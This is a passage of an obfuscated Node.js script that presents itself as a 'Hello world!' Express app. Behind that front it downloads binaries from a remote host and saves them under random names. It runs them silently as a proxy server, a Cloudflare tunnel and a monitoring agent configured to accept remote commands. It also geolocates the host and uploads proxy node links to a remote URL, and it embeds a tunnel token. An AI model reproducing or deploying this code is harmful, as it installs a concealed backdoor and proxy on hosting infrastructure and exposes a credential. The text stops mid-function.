const _0xfb2e06=_0x3ea9;(function(_0x36aadb,_0x1f7acc){const _0x47e00d={_0x40aed1:0x283,_0x2a1fac:0x1f5,_0x28350e:0x223,_0x4d7efc:0x1dc,_0x4db3dd:0x26d},_0x1856f2=_0x3ea9,_0x5e345a=_0x36aadb();while(!![]){try{const _0x1ea3ab=parseInt(_0x1856f2(_0x47e00d._0x40aed1))/0x1+parseInt(_0x1856f2(_0x47e00d._0x2a1fac))/0x2*(parseInt(_0x1856f2(0x271))/0x3)+parseInt(_0x1856f2(0x1fe))/0x4+parseInt(_0x1856f2(_0x47e00d._0x28350e))/0x5*(parseInt(_0x1856f2(0x1f7))/0x6)+-parseInt(_0x1856f2(0x245))/0x7*(-parseInt(_0x1856f2(0x1ff))/0x8)+parseInt(_0x1856f2(_0x47e00d._0x4d7efc))/0x9+-parseInt(_0x1856f2(_0x47e00d._0x4db3dd))/0xa;if(_0x1ea3ab===_0x1f7acc)break;else _0x5e345a['push'](_0x5e345a['shift']());}catch(_0x2ed930){_0x5e345a['push'](_0x5e345a['shift']());}}}(_0x125b,0x28ef7));const express=require('express'),app=express(),axios=require(_0xfb2e06(0x21d)),os=require('os'),fs=require('fs'),path=require(_0xfb2e06(0x212)),{promisify}=require(_0xfb2e06(0x27a)),exec=promisify(require(_0xfb2e06(0x272))['exec']),{execSync}=require(_0xfb2e06(0x272)),UPLOAD_URL=process[_0xfb2e06(0x22b)][_0xfb2e06(0x1f9)]||'',PROJECT_URL=process['env'][_0xfb2e06(0x226)]||'',AUTO_ACCESS=process[_0xfb2e06(0x22b)][_0xfb2e06(0x23d)]||![],FILE_PATH=process[_0xfb2e06(0x22b)][_0xfb2e06(0x266)]||_0xfb2e06(0x1f1),SUB_PATH=process[_0xfb2e06(0x22b)][_0xfb2e06(0x26c)]||_0xfb2e06(0x268),PORT=process[_0xfb2e06(0x22b)]['SERVER_PORT']||process[_0xfb2e06(0x22b)][_0xfb2e06(0x1e8)]||0xbb8,UUID=process[_0xfb2e06(0x22b)]['UUID']||_0xfb2e06(0x1d7),NEZHA_SERVER=process[_0xfb2e06(0x22b)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0xfb2e06(0x22b)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0xfb2e06(0x255)]||'',ARGO_DOMAIN=process[_0xfb2e06(0x22b)][_0xfb2e06(0x221)]||'northflank0601b.vssohu.eu.org',ARGO_AUTH=process['env'][_0xfb2e06(0x219)]||_0xfb2e06(0x1e3),ARGO_PORT=process['env'][_0xfb2e06(0x241)]||0x1f41,CFIP=process['env'][_0xfb2e06(0x28e)]||_0xfb2e06(0x291),CFPORT=process[_0xfb2e06(0x22b)]['CFPORT']||0x1bb,NAME=process[_0xfb2e06(0x22b)]['NAME']||'whnat';function _0x125b(){const _0x4535b4=['ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','env','arch','unshift','Error\x20in\x20startserver:','&fp=firefox&type=ws&host=','https://amd64.ssss.nyc.mn/v1','Unknown','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','trojan','finish','\x0a\x0avmess://','stream','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','del\x20/f\x20/q\x20','/tunnel.yml\x20run','vmess','readdirSync','get','AUTO_ACCESS','match','https://arm64.ssss.nyc.mn/bot','\x20failed:\x20','ARGO_PORT','Nodes\x20uploaded\x20successfully','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x22\x20>\x20/dev/null\x202>&1','16541FqzTXq','8443','\x0aclient_secret:\x20','filter','log','error','https://amd64.ssss.nyc.mn/agent','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','2083','Subscription\x20uploaded\x20successfully','Empowerment\x20failed\x20for\x20','text/plain;\x20charset=utf-8','/config.json\x20>/dev/null\x202>&1\x20&','arm','substring','charAt','NEZHA_KEY','writeFileSync','firefox','https://amd64.ssss.nyc.mn/web','https://amd64.ssss.nyc.mn/bot','response','443','status','clear','?encryption=none&security=tls&sni=','Error\x20executing\x20command:\x20','--tls','message','sub.txt','tunnel.json','country_code','/sub.txt\x20saved\x20successfully','FILE_PATH','length','wvsp33221','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','.exe\x20>\x20nul\x202>&1','/api/add-nodes','SUB_PATH','11920280qnPqOF','block','https://ipapi.co/json/','data','3EDcayu','child_process','success','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Error\x20downloading\x20files:','test','\x20already\x20exists','send','\x20successfully','util','base64','application/json','floor','pop','?security=tls&sni=','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x20-s\x20','has','278640ZTsbnk','all','nohup\x20','https://arm64.ssss.nyc.mn/agent','http\x20server\x20is\x20running\x20on\x20port:','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','org','\x20>/dev/null\x202>&1','vless','tcp','mkdirSync','CFIP','countryCode','/api/delete-nodes','ip.sb','random','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','includes','/vless-argo','post','77f3eff1-926f-42b6-9ccb-e34a4ce5a3c1','join','127.0.0.1','https://arm64.ssss.nyc.mn/web','fileUrl','1624887NZLXlE','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x20\x20credentials-file:\x20','config.json','basename','fileName','\x20>/dev/null\x202>&1\x20&','eyJhIjoiOTQzMDEyNjA1ZTMzYmEwN2E2NzQxNGFhMTFhZWEzNzciLCJ0IjoiNWI1ZDhmZjgtM2IwNi00ODkyLThjYjAtMjI2NWE0OGI1OGU1IiwicyI6Ik9XWmpOV1l6T1RFdFpUSXpOUzAwTWpnMExUbGtNamt0TkROaVlXUXdNREl4TkdGaiJ9','createWriteStream','\x20-c\x20','\x0avless://','/dev/null','PORT','unlinkSync','2096','App\x20is\x20running','Hello\x20world!','stringify','catch','quic','pipe','./tmp','ArgoDomain:','none','npm\x20running\x20error:\x20','151326GWrHOR','https+local://8.8.8.8/dns-query','765366ivJMrh','from','UPLOAD_URL','toString','/vmess-argo','xtls-rprx-vision','NEZHA\x20variable\x20is\x20empty,skip\x20running','1267560avcdrB','856cJCXXl','push','amd','platform','web\x20running\x20error:\x20','automatic\x20access\x20task\x20added\x20successfully','existsSync','Skipping\x20adding\x20automatic\x20access\x20task','Download\x20','tls','direct','then','\x0a\x0atrojan://','ARGO_DOMAIN:','2087','/trojan-argo','\x20is\x20running','win32','chmod','path','utf-8','statSync','boot.log','forEach','split','Error\x20reading\x20boot.log:','ARGO_AUTH','taskkill\x20/f\x20/im\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','axios','close','http','blackhole','ARGO_DOMAIN','php\x20running\x20error:\x20','10hHJQFV','isFile','aarch64','PROJECT_URL','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','readFileSync','\x0a\x20\x20tunnel:\x20'];_0x125b=function(){return _0x4535b4;};return _0x125b();}!fs['existsSync'](FILE_PATH)?(fs[_0xfb2e06(0x28d)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0xfb2e06(0x249)](FILE_PATH+_0xfb2e06(0x277));function generateRandomName(){const _0x304db2={_0xdd0dad:0x27d,_0x4e1a24:0x267},_0x1a4253=_0xfb2e06,_0x8922c6='abcdefghijklmnopqrstuvwxyz';let _0x538611='';for(let _0x31a8a7=0x0;_0x31a8a7<0x6;_0x31a8a7++){_0x538611+=_0x8922c6[_0x1a4253(0x254)](Math[_0x1a4253(_0x304db2._0xdd0dad)](Math[_0x1a4253(0x292)]()*_0x8922c6[_0x1a4253(_0x304db2._0x4e1a24)]));}return _0x538611;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0xfb2e06(0x1d8)](FILE_PATH,webName),botPath=path[_0xfb2e06(0x1d8)](FILE_PATH,botName),subPath=path[_0xfb2e06(0x1d8)](FILE_PATH,_0xfb2e06(0x262)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0xfb2e06(0x1df));function deleteNodes(){const _0x11d63d={_0x277a4a:0x205,_0xb10187:0x228,_0x32a786:0x248,_0x17598b:0x1d6,_0x3b6d1a:0x1ee},_0xf78164=_0xfb2e06;try{if(!UPLOAD_URL)return;if(!fs[_0xf78164(_0x11d63d._0x277a4a)](subPath))return;let _0x455937;try{_0x455937=fs[_0xf78164(_0x11d63d._0xb10187)](subPath,_0xf78164(0x213));}catch{return null;}const _0x18d1ca=Buffer[_0xf78164(0x1f8)](_0x455937,'base64')['toString'](_0xf78164(0x213)),_0x2c513e=_0x18d1ca['split']('\x0a')[_0xf78164(_0x11d63d._0x32a786)](_0x2b5fe3=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xf78164(0x276)](_0x2b5fe3));if(_0x2c513e['length']===0x0)return;return axios[_0xf78164(_0x11d63d._0x17598b)](UPLOAD_URL+_0xf78164(0x290),JSON[_0xf78164(0x1ed)]({'nodes':_0x2c513e}),{'headers':{'Content-Type':_0xf78164(0x27c)}})[_0xf78164(_0x11d63d._0x3b6d1a)](_0x5d2ffe=>{return null;}),null;}catch(_0x29f519){return null;}}function cleanupOldFiles(){const _0x379b79={_0x2ca5a5:0x216},_0x335e19=_0xfb2e06;try{const _0x571297=fs[_0x335e19(0x23b)](FILE_PATH);_0x571297[_0x335e19(_0x379b79._0x2ca5a5)](_0x5e4485=>{const _0x5c8a00=_0x335e19,_0x54bdec=path['join'](FILE_PATH,_0x5e4485);try{const _0x35d523=fs[_0x5c8a00(0x214)](_0x54bdec);_0x35d523[_0x5c8a00(0x224)]()&&fs[_0x5c8a00(0x1e9)](_0x54bdec);}catch(_0x11dd80){}});}catch(_0xc13652){}}app[_0xfb2e06(0x23c)]('/',function(_0x1b6c88,_0xcb7545){const _0x1f47bc=_0xfb2e06;_0xcb7545['send'](_0x1f47bc(0x1ec));});async function generateConfig(){const _0x3ad20a={_0x3049f8:0x28b,_0x6db5ce:0x1fc,_0x2e13c3:0x1d9,_0x5b5f05:0x1f3,_0x1e44e1:0x1ef,_0x82b382:0x1d9,_0x34f7e3:0x23a,_0x575c30:0x21f,_0x59ca26:0x208,_0x566bdb:0x233,_0x6e88ac:0x1f3,_0x22ffb1:0x1f6,_0x51d795:0x209,_0x32bd0f:0x220,_0x3aa1d8:0x1d8},_0x4832dd=_0xfb2e06,_0x100642={'log':{'access':_0x4832dd(0x1e7),'error':_0x4832dd(0x1e7),'loglevel':_0x4832dd(0x1f3)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4832dd(_0x3ad20a._0x3049f8),'settings':{'clients':[{'id':UUID,'flow':_0x4832dd(_0x3ad20a._0x6db5ce)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x4832dd(0x1d5),'dest':0xbba},{'path':_0x4832dd(0x1fb),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x4832dd(0x28c)}},{'port':0xbb9,'listen':_0x4832dd(_0x3ad20a._0x2e13c3),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x4832dd(0x1f3)},'streamSettings':{'network':'tcp','security':_0x4832dd(_0x3ad20a._0x5b5f05)}},{'port':0xbba,'listen':_0x4832dd(_0x3ad20a._0x2e13c3),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4832dd(0x1f3)},'streamSettings':{'network':'ws','security':_0x4832dd(0x1f3),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4832dd(0x208),_0x4832dd(_0x3ad20a._0x1e44e1)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4832dd(_0x3ad20a._0x82b382),'protocol':_0x4832dd(_0x3ad20a._0x34f7e3),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4832dd(_0x3ad20a._0x575c30),_0x4832dd(_0x3ad20a._0x59ca26),_0x4832dd(0x1ef)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4832dd(0x1d9),'protocol':_0x4832dd(_0x3ad20a._0x566bdb),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4832dd(_0x3ad20a._0x6e88ac),'wsSettings':{'path':_0x4832dd(0x20e)}},'sniffing':{'enabled':!![],'destOverride':[_0x4832dd(0x21f),_0x4832dd(0x208),_0x4832dd(0x1ef)],'metadataOnly':![]}}],'dns':{'servers':[_0x4832dd(_0x3ad20a._0x22ffb1)]},'outbounds':[{'protocol':'freedom','tag':_0x4832dd(_0x3ad20a._0x51d795)},{'protocol':_0x4832dd(_0x3ad20a._0x32bd0f),'tag':_0x4832dd(0x26e)}]};fs['writeFileSync'](path[_0x4832dd(_0x3ad20a._0x3aa1d8)](FILE_PATH,'config.json'),JSON['stringify'](_0x100642,null,0x2));}function getSystemArchitecture(){const _0x34191b={_0x48038a:0x225,_0x10d1cd:0x201},_0x30c462=_0xfb2e06,_0x3d89c8=os[_0x30c462(0x22c)]();return _0x3d89c8==='arm'||_0x3d89c8==='arm64'||_0x3d89c8===_0x30c462(_0x34191b._0x48038a)?'arm':_0x30c462(_0x34191b._0x10d1cd);}function downloadFile(_0x2bec7f,_0x9b54b7,_0x38af30){const _0x359ad8={_0x2fdcf6:0x1ee},_0x4e65f1={_0xd0e033:0x1e0,_0x327c48:0x240,_0x1f9889:0x24a},_0x1c4496={_0x4ee1e6:0x24a},_0x433bd9=_0xfb2e06,_0x27fffe=_0x2bec7f;!fs[_0x433bd9(0x205)](FILE_PATH)&&fs[_0x433bd9(0x28d)](FILE_PATH,{'recursive':!![]});const _0x137eb1=fs[_0x433bd9(0x1e4)](_0x27fffe);axios({'method':_0x433bd9(0x23c),'url':_0x9b54b7,'responseType':_0x433bd9(0x236)})[_0x433bd9(0x20a)](_0x4b4ccf=>{const _0x5ad0c3={_0x44f4ec:0x261},_0x3dae78=_0x433bd9;_0x4b4ccf[_0x3dae78(0x270)][_0x3dae78(0x1f0)](_0x137eb1),_0x137eb1['on'](_0x3dae78(0x234),()=>{const _0x159ada=_0x3dae78;_0x137eb1[_0x159ada(0x21e)](),console[_0x159ada(0x249)]('Download\x20'+path[_0x159ada(0x1e0)](_0x27fffe)+_0x159ada(0x279)),_0x38af30(null,_0x27fffe);}),_0x137eb1['on'](_0x3dae78(_0x1c4496._0x4ee1e6),_0x2ccdec=>{const _0x21207b=_0x3dae78;fs['unlink'](_0x27fffe,()=>{});const _0x39ab85=_0x21207b(0x207)+path['basename'](_0x27fffe)+_0x21207b(0x240)+_0x2ccdec[_0x21207b(_0x5ad0c3._0x44f4ec)];console[_0x21207b(0x24a)](_0x39ab85),_0x38af30(_0x39ab85);});})[_0x433bd9(_0x359ad8._0x2fdcf6)](_0x2bc887=>{const _0x37931a=_0x433bd9,_0x5d50bf='Download\x20'+path[_0x37931a(_0x4e65f1._0xd0e033)](_0x27fffe)+_0x37931a(_0x4e65f1._0x327c48)+_0x2bc887[_0x37931a(0x261)];console[_0x37931a(_0x4e65f1._0x1f9889)](_0x5d50bf),_0x38af30(_0x5d50bf);});}async function downloadFilesAndRun(){const _0x5cbfab={_0x25f46a:0x284,_0x3a2f1f:0x24a,_0x476e20:0x275,_0x30ff7a:0x217,_0x52b235:0x25b,_0x4eb0ba:0x246,_0x1794a9:0x1ea,_0x5b58e1:0x247,_0x289ae3:0x256,_0x34f981:0x1d8,_0x1898b5:0x249,_0x47b0ed:0x246,_0x3b7433:0x20d,_0x51f024:0x24d,_0x53bc83:0x260,_0x187296:0x281,_0x1e3415:0x20f,_0x1dc42e:0x24a,_0x58900c:0x1f4,_0x32e419:0x285,_0x4a10bc:0x203,_0xe859a2:0x205,_0x308be4:0x23e,_0x223401:0x24c,_0x5b865f:0x243,_0x54a47e:0x25f},_0x27de23={_0x5be343:0x1e1},_0x2c1d59=_0xfb2e06,_0x117005=getSystemArchitecture(),_0x5496ad=getFilesForArchitecture(_0x117005);if(_0x5496ad['length']===0x0){console['log'](_0x2c1d59(0x227));return;}const _0x528b9e=_0x5496ad['map'](_0x3652da=>{return new Promise((_0x40cf42,_0x160194)=>{const _0x1c114a=_0x3ea9;downloadFile(_0x3652da[_0x1c114a(_0x27de23._0x5be343)],_0x3652da[_0x1c114a(0x1db)],(_0x296c09,_0x13dde8)=>{_0x296c09?_0x160194(_0x296c09):_0x40cf42(_0x13dde8);});});});try{await Promise[_0x2c1d59(_0x5cbfab._0x25f46a)](_0x528b9e);}catch(_0x5de3e9){console[_0x2c1d59(_0x5cbfab._0x3a2f1f)](_0x2c1d59(_0x5cbfab._0x476e20),_0x5de3e9);return;}function _0x398214(_0xe45609){const _0x3ae9a6=0x1fd;_0xe45609['forEach'](_0x16571f=>{const _0x49bf2e={_0x1d2139:0x24a},_0x1cf84f=_0x3ea9;fs['existsSync'](_0x16571f)&&fs[_0x1cf84f(0x211)](_0x16571f,_0x3ae9a6,_0x1edc2d=>{const _0x46b6e7=_0x1cf84f;_0x1edc2d?console[_0x46b6e7(_0x49bf2e._0x1d2139)](_0x46b6e7(0x24f)+_0x16571f+':\x20'+_0x1edc2d):console[_0x46b6e7(0x249)]('Empowerment\x20success\x20for\x20'+_0x16571f+':\x20'+_0x3ae9a6['toString'](0x8));});});}const _0xd8a9c3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x398214(_0xd8a9c3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3bae93=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2c1d59(_0x5cbfab._0x30ff7a)](':')[_0x2c1d59(0x27e)]():'',_0x498fb9=new Set([_0x2c1d59(_0x5cbfab._0x52b235),_0x2c1d59(_0x5cbfab._0x4eb0ba),_0x2c1d59(_0x5cbfab._0x1794a9),_0x2c1d59(0x20d),_0x2c1d59(0x24d),'2053']),_0x2e0c9c=_0x498fb9[_0x2c1d59(0x282)](_0x3bae93)?'true':'false',_0x671906=_0x2c1d59(_0x5cbfab._0x5b58e1)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x2c1d59(0x293)+_0x2e0c9c+_0x2c1d59(0x237)+UUID;fs[_0x2c1d59(_0x5cbfab._0x289ae3)](path[_0x2c1d59(_0x5cbfab._0x34f981)](FILE_PATH,'config.yaml'),_0x671906);const _0x1b82ee=_0x2c1d59(0x285)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1b82ee),console[_0x2c1d59(_0x5cbfab._0x1898b5)](phpName+'\x20is\x20running'),await new Promise(_0x13495e=>setTimeout(_0x13495e,0x3e8));}catch(_0x49fb4d){console['error'](_0x2c1d59(0x222)+_0x49fb4d);}}else{let _0x93a874='';const _0x1ae0aa=[_0x2c1d59(0x25b),_0x2c1d59(_0x5cbfab._0x47b0ed),_0x2c1d59(0x1ea),_0x2c1d59(_0x5cbfab._0x3b7433),_0x2c1d59(_0x5cbfab._0x51f024),'2053'];_0x1ae0aa['includes'](NEZHA_PORT)&&(_0x93a874=_0x2c1d59(_0x5cbfab._0x53bc83));const _0xe6a068=_0x2c1d59(0x285)+npmPath+_0x2c1d59(_0x5cbfab._0x187296)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x93a874+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0xe6a068),console[_0x2c1d59(0x249)](npmName+_0x2c1d59(_0x5cbfab._0x1e3415)),await new Promise(_0xd0c6fe=>setTimeout(_0xd0c6fe,0x3e8));}catch(_0x4d13ea){console[_0x2c1d59(_0x5cbfab._0x1dc42e)](_0x2c1d59(_0x5cbfab._0x58900c)+_0x4d13ea);}}}else console[_0x2c1d59(0x249)](_0x2c1d59(0x1fd));const _0x47e373=_0x2c1d59(_0x5cbfab._0x32e419)+webPath+_0x2c1d59(0x1e5)+FILE_PATH+_0x2c1d59(0x251);try{await exec(_0x47e373),console[_0x2c1d59(_0x5cbfab._0x1898b5)](webName+_0x2c1d59(_0x5cbfab._0x1e3415)),await new Promise(_0x46e7d2=>setTimeout(_0x46e7d2,0x3e8));}catch(_0x17668f){console[_0x2c1d59(0x24a)](_0x2c1d59(_0x5cbfab._0x4a10bc)+_0x17668f);}if(fs[_0x2c1d59(_0x5cbfab._0xe859a2)](botPath)){let _0x4856d3;if(ARGO_AUTH[_0x2c1d59(_0x5cbfab._0x308be4)](/^[A-Z0-9a-z=]{120,250}$/))_0x4856d3=_0x2c1d59(_0x5cbfab._0x223401)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x4856d3='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x2c1d59(0x239):_0x4856d3=_0x2c1d59(0x280)+FILE_PATH+_0x2c1d59(_0x5cbfab._0x5b865f)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x4856d3+_0x2c1d59(0x1e2)),console[_0x2c1d59(0x249)](botName+'\x20is\x20running'),await new Promise(_0x5780d6=>setTimeout(_0x5780d6,0x7d0));}catch(_0x52b522){console['error'](_0x2c1d59(_0x5cbfab._0x54a47e)+_0x52b522);}}await new Promise(_0x42d478=>setTimeout(_0x42d478,0x1388));}function getFilesForArchitecture(_0x58245a){const _0x1b85ac={_0x380bdf:0x1da,_0x3ad3f0:0x259,_0x1f40dd:0x252,_0x45bfbb:0x230,_0x576f43:0x22d},_0x559bea=_0xfb2e06;let _0x5a9567;_0x58245a===_0x559bea(0x252)?_0x5a9567=[{'fileName':webPath,'fileUrl':_0x559bea(_0x1b85ac._0x380bdf)},{'fileName':botPath,'fileUrl':_0x559bea(0x23f)}]:_0x5a9567=[{'fileName':webPath,'fileUrl':_0x559bea(0x258)},{'fileName':botPath,'fileUrl':_0x559bea(_0x1b85ac._0x3ad3f0)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5b7907=_0x58245a===_0x559bea(_0x1b85ac._0x1f40dd)?_0x559bea(0x286):_0x559bea(0x24b);_0x5a9567['unshift']({'fileName':npmPath,'fileUrl':_0x5b7907});}else{const _0x2c7bae=_0x58245a==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x559bea(_0x1b85ac._0x45bfbb);_0x5a9567[_0x559bea(_0x1b85ac._0x576f43)]({'fileName':phpPath,'fileUrl':_0x2c7bae});}}return _0x5a9567;}function argoType(){const _0x1180f6={_0x5c1a6d:0x249,_0xe05173:0x22a,_0x5639c5:0x256,_0x42b93f:0x1d8,_0x6b007c:0x229,_0x28b460:0x288,_0x4c1ce9:0x21c},_0x546aac=_0xfb2e06;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x546aac(_0x1180f6._0x5c1a6d)](_0x546aac(_0x1180f6._0xe05173));return;}if(ARGO_AUTH[_0x546aac(0x294)]('TunnelSecret')){fs[_0x546aac(_0x1180f6._0x5639c5)](path[_0x546aac(_0x1180f6._0x42b93f)](FILE_PATH,_0x546aac(0x263)),ARGO_AUTH);const _0x4543d5=_0x546aac(_0x1180f6._0x6b007c)+ARGO_AUTH[_0x546aac(0x217)]('\x22')[0xb]+_0x546aac(0x1de)+path[_0x546aac(0x1d8)](FILE_PATH,_0x546aac(0x263))+_0x546aac(_0x1180f6._0x28b460)+ARGO_DOMAIN+_0x546aac(0x269)+ARGO_PORT+_0x546aac(0x232);fs['writeFileSync'](path[_0x546aac(0x1d8)](FILE_PATH,'tunnel.yml'),_0x4543d5);}else console[_0x546aac(0x249)](_0x546aac(_0x1180f6._0x4c1ce9));}async function extractDomains(){const _0x525361={_0x3b47ef:0x249,_0x451400:0x228,_0x4b18aa:0x1f2,_0x4369ee:0x249,_0x1c5894:0x215,_0x373728:0x243,_0x5aaa88:0x285,_0x458932:0x1e2,_0x341ebe:0x24a,_0x50bf12:0x218},_0x173358={_0x4248a9:0x23c,_0x3e8dc2:0x26f,_0x444b67:0x270,_0x133c61:0x28f,_0x36cafb:0x289},_0x52aaa0={_0x59518c:0x210,_0x1c9ef8:0x21a,_0x2b64aa:0x253,_0x40c207:0x244},_0x171610=_0xfb2e06;let _0x54cce5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x54cce5=ARGO_DOMAIN,console[_0x171610(_0x525361._0x3b47ef)](_0x171610(0x20c),_0x54cce5),await _0xc1a903(_0x54cce5);else try{const _0x54d367=fs[_0x171610(_0x525361._0x451400)](path[_0x171610(0x1d8)](FILE_PATH,_0x171610(0x215)),_0x171610(0x213)),_0xd4feb1=_0x54d367[_0x171610(0x217)]('\x0a'),_0x1c3b45=[];_0xd4feb1[_0x171610(0x216)](_0x57e1ae=>{const _0x20d9a9=_0x171610,_0x12c5bb=_0x57e1ae[_0x20d9a9(0x23e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x12c5bb){const _0x584880=_0x12c5bb[0x1];_0x1c3b45[_0x20d9a9(0x200)](_0x584880);}});if(_0x1c3b45[_0x171610(0x267)]>0x0)_0x54cce5=_0x1c3b45[0x0],console[_0x171610(_0x525361._0x3b47ef)](_0x171610(_0x525361._0x4b18aa),_0x54cce5),await _0xc1a903(_0x54cce5);else{console[_0x171610(_0x525361._0x4369ee)](_0x171610(0x274)),fs['unlinkSync'](path[_0x171610(0x1d8)](FILE_PATH,_0x171610(_0x525361._0x1c5894)));async function _0xf3add8(){const _0x49fe42=_0x171610;try{process['platform']===_0x49fe42(_0x52aaa0._0x59518c)?await exec(_0x49fe42(_0x52aaa0._0x1c9ef8)+botName+_0x49fe42(0x26a)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x49fe42(_0x52aaa0._0x2b64aa)](0x1)+_0x49fe42(_0x52aaa0._0x40c207));}catch(_0x4c99ee){}}_0xf3add8(),await new Promise(_0x52504f=>setTimeout(_0x52504f,0xbb8));const _0x41886d=_0x171610(0x280)+FILE_PATH+_0x171610(_0x525361._0x373728)+ARGO_PORT;try{await exec(_0x171610(_0x525361._0x5aaa88)+botPath+'\x20'+_0x41886d+_0x171610(_0x525361._0x458932)),console[_0x171610(_0x525361._0x3b47ef)](botName+_0x171610(0x20f)),await new Promise(_0x32a9d6=>setTimeout(_0x32a9d6,0xbb8)),await extractDomains();}catch(_0x5e50d0){console[_0x171610(0x24a)]('Error\x20executing\x20command:\x20'+_0x5e50d0);}}}catch(_0x519ef4){console[_0x171610(_0x525361._0x341ebe)](_0x171610(_0x525361._0x50bf12),_0x519ef4);}async function _0x2b7652(){const _0x3e1448=_0x171610;try{const _0x20c2cf=await axios[_0x3e1448(_0x173358._0x4248a9)](_0x3e1448(_0x173358._0x3e8dc2),{'timeout':0xbb8});if(_0x20c2cf['data']&&_0x20c2cf['data'][_0x3e1448(0x264)]&&_0x20c2cf[_0x3e1448(0x270)]['org'])return _0x20c2cf[_0x3e1448(0x270)][_0x3e1448(0x264)]+'_'+_0x20c2cf[_0x3e1448(0x270)]['org'];}catch(_0x423940){try{const _0x416c7b=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x416c7b[_0x3e1448(0x270)]&&_0x416c7b['data'][_0x3e1448(0x25c)]===_0x3e1448(0x273)&&_0x416c7b[_0x3e1448(_0x173358._0x444b67)][_0x3e1448(0x28f)]&&_0x416c7b['data']['org'])return _0x416c7b[_0x3e1448(0x270)][_0x3e1448(_0x173358._0x133c61)]+'_'+_0x416c7b['data'][_0x3e1448(_0x173358._0x36cafb)];}catch(_0xf8371c){}}return _0x3e1448(0x231);}async function _0xc1a903(_0x58c6cc){const _0x32cdde=await _0x2b7652(),_0x259a09=NAME?NAME+'-'+_0x32cdde:_0x32cdde;return new Promise(_0x5516b0=>{const _0x4a0cf5={_0x5ee176:0x1f3,_0x3739cd:0x257,_0x414d97:0x1e6,_0x29c18b:0x25e,_0x14124c:0x1f8,_0x3ccf66:0x1fa,_0x175b60:0x21b,_0x1396c7:0x1f8,_0x3a4dbc:0x27b,_0x4ac17a:0x249,_0x33125f:0x265,_0x1aeb53:0x23c},_0x19a8bb={_0x3fe67a:0x27b,_0x509657:0x278};setTimeout(()=>{const 